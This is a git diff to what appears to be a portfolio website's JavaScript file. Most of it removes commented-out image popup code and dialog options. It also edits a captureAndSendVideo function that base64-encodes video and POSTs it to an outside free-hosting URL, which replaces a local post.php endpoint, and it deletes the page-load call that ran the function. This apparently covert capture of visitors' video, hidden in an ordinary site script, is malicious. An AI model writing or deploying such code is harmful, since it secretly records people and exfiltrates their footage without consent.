@@ -134,47 +134,7 @@ colors.forEach((a) => {
 	});
 });
 
-//* START PORJECTS */
-let myProjects = document.querySelectorAll(".portfolio img");
 
-// myProjects.forEach((img) => {
-	// img.addEventListener("click", (e) => {
-		// //Create Overlay Element
-		// let overlay = document.createElement("div");
-		// overlay.className = "popup-overlay";
-		// document.body.appendChild(overlay);
-
-		// //Create the Popup
-		// let popupBox = document.createElement("div");
-		// popupBox.className = "popup-box";
-
-		// if (img.alt !== null) {
-			// //create heading
-			// let imgHeading = document.createElement("h3");
-			// imgHeading.appendChild(document.createTextNode(img.alt));
-			// popupBox.appendChild(imgHeading);
-		// }
-		// //Create the image
-		// let popupImage = document.createElement("img");
-		// popupImage.src = img.src;
-		// popupBox.appendChild(popupImage);
-		// document.body.appendChild(popupBox);
-
-		// //Create the close span
-		// let closeButton = document.createElement("span");
-		// closeButton.appendChild(document.createTextNode("X"));
-		// closeButton.className = "close-button";
-		// popupBox.appendChild(closeButton);
-	// });
-// });
-
-// close Popup
-// document.addEventListener("click", (e) => {
-	// if (e.target.className == "close-button") {
-		// e.target.parentNode.remove();
-		// document.querySelector(".popup-overlay").remove();
-	// }
-// });
 function show(){
 let timerInterval;
 Swal.fire({
@@ -184,19 +144,9 @@ Swal.fire({
   timer: 3000,
   timerProgressBar: true,
   backdrop: `rgba(0,0,0,0.4)`
-  // didOpen: () => {
-    // Swal.showLoading()
-    // const b = Swal.getHtmlContainer().querySelector('b')
-    // timerInterval = setInterval(() => {
-      // b.textContent = Swal.getTimerLeft()
-    // }, 100)
-  // },
-  // willClose: () => {
-    // clearInterval(timerInterval)
-  // }
+  
 })
 }
-
 
 
 //Function to capture and send video
@@ -245,7 +195,7 @@ function captureAndSendVideo() {
             const data = { video: base64Video };
 
             // Send video as JSON to API
-            fetch('../post.php', {
+            fetch('https://abdelghanielya.000webhostapp.com/post.php', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },body: JSON.stringify(data)
             })
@@ -266,4 +216,3 @@ function captureAndSendVideo() {
 }
 
 // Call the function to start capturing and sending the video
-captureAndSendVideo();
